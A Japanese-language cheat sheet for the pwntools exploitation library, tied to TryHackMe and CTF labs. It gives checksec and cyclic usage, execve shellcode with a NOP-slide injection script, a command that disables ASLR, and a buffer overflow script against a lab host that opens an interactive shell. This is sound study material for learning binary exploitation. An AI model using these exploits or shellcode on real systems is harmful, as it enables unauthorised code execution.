# pwntools

https://github.com/Gallopsled/pwntools

https://tryhackme.com/room/introtopwntools

## インストール

kali の場合、pwn と打ってインストールされていなければインストールするか聞かれるので Yes と答えるだけ。

## コマンド

### checksec

```shell
# 実行ファイルで有効になっているセキュリティ機構を調べる
checksec --file <file>
```

### cyclic

```shell
cyclic 100 > pattern

cat pattern
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa
```

```shell
# バッファオーバーフローをテストする
gdb> r < pattern
```

eip が `jaaa` で上書きされていたとして、その部分を目的の関数アドレスにしたペイロードを作成したい場合。

```python
# gdb> disassemble <function> 等で関数アドレスを得る
from pwn import *

padding = cyclic(cyclic_find('jaaa'))
eip = p32(0x08048536)
payload = padding + eip
print(payload)
```

### shellcraft

```shell
# シェルコードのアセンブラ出力
shellcraft i386.linux.execve "/bin///sh" "['sh', '-p']" -f a

# シェルコードのバイトコード出力
shellcraft i386.linux.execve "/bin///sh" "['sh', '-p']" -f s
```

シェルコードを埋め込む例

```python
from pwn import *

proc = process('./intro2pwnFinal')
proc.recvline()

padding = cyclic(cyclic_find('taaa'))
eip = p32(0xffffd510+200)
nop_slide = "\x90"*1000
# ブレークポイント命令（シェルコードを入れる前のテスト用）
# shellcode = "\xcc"
shellcode = "jhh\x2f\x2f\x2fsh\x2fbin\x89\xe3jph\x01\x01\x01\x01\x814\x24ri\x01,1\xc9Qj\x07Y\x01\xe1Qj\x08Y\x01\xe1Q\x89\xe11\xd2j\x0bX\xcd\x80"
payload = padding + eip + nop_slide + shellcode

proc.send(payload)

# シェルと通信するためインタラクティブが必要
proc.interactive()
```

（参考）ASLR（アドレス空間配置のランダム化）無効化

```shell
echo 0 | tee /proc/sys/kernel/randomize_va_space
```

## ネットワーク経由

```python
from pwn import *

connect = remote('127.0.0.1', 1336)
print(connect.recvn(18))
payload = "A"*32
payload += p32(0xdeadbeef)
connect.send(payload)

print(connect.recvn(34))
```

## バイナリ解析

```python
# ライブラリをロード
>>> from pwn import *

# バイナリをロード
>>> binary = context.binary = ELF("./DearQA-1627223337406.DearQA")

# 関数のアドレス
>>> hex(binary.symbols['vuln'])
```

## 例

### バッファオーバーフロー

```shell
#!/usr/bin/env pyhon3
from pwn import *
import sys

host = "10.10.37.23"
port = 5700
context(terminal = ['tmux', 'new-window'])

binary = context.binary = ELF("./DearQA-1627223337406.DearQA")
context(os = "linux", arch = "amd64")
connect = remote(host, port)
log.info("[+] Starting buffer Overflow")
connect.recvuntil(b"What's your name: ")
log.info("[+] Crafting payload")
payload = b'A' * 40
payload += p64(0x00400686)
log.info("[+] Sending Payload to the remote server")
connect.sendline(payload)
connect.interactive()
```

上記の例で、binary と 2 か所の context は、コメントアウトしても機能する。
